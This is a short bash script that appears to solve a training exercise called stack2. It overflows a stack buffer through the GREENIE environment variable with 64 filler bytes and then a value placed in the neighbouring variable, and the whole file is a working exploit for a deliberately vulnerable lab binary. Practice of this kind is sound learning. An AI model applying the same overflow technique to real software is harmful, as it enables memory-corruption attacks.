#!/usr/bin/env bash

# Buffer overflow to put 0x0d0a0d0a into the next variable on the stack.
# Uses env variables instead of stdin

export GREENIE=`python -c "print 'A' * 64 + '\n\r\n\r'"` && ./stack2
